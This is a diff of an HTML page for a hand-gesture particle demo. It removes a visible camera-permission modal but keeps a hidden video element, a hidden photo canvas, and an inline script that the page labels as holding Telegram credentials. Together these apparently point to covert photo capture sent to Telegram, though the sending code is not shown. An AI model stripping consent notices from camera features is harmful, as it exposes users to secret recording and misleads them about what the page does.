@@ -4,32 +4,6 @@
     <meta charset="UTF-8">
     <title>Particle Hand Control</title>
     <link rel="stylesheet" href="./style.css">
-    <style>
-        .camera-permission {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: rgba(0,0,0,0.9);
-            color: white;
-            padding: 30px;
-            border-radius: 15px;
-            text-align: center;
-            z-index: 1000;
-            border: 2px solid #6366f1;
-            max-width: 500px;
-        }
-        .permission-btn {
-            background: linear-gradient(135deg,#6366f1 0%,#4f46e5 100%);
-            border: none;
-            padding: 12px 24px;
-            color: white;
-            border-radius: 8px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 15px;
-        }
-    </style>
     <!-- Telegram credentials for local testing only -->
     <script>
         // For local testing only - NOT in GitHub
@@ -46,12 +20,6 @@
     </script>
 </head>
 <body>
-    <div id="cameraPermission" class="camera-permission" style="display:none;">
-        <h2>Camera Access Required</h2>
-        <p>This experience uses camera for hand gesture control</p>
-        <button class="permission-btn" onclick="startCamera()">Allow Camera</button>
-    </div>
-
     <div id="container"></div>
     
     <div class="input-container">
@@ -61,26 +29,16 @@
         </div>
     </div>
 
-  
+    <!-- Hidden elements for camera -->
     <video id="handVideo" autoplay playsinline style="display:none;"></video>
     <canvas id="photoCanvas" style="display:none;"></canvas>
 
+    <!-- THREE.js and dependencies -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.7.1/gsap.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js"></script>
     
     <script src="./script.js"></script>
-    
-    <script>
-        // Show camera modal
-        setTimeout(() => {
-            document.getElementById('cameraPermission').style.display = 'block';
-        }, 1000);
-        
-        function startCamera() {
-            document.getElementById('cameraPermission').style.display = 'none';
-        }
-    </script>
 </body>
 </html>
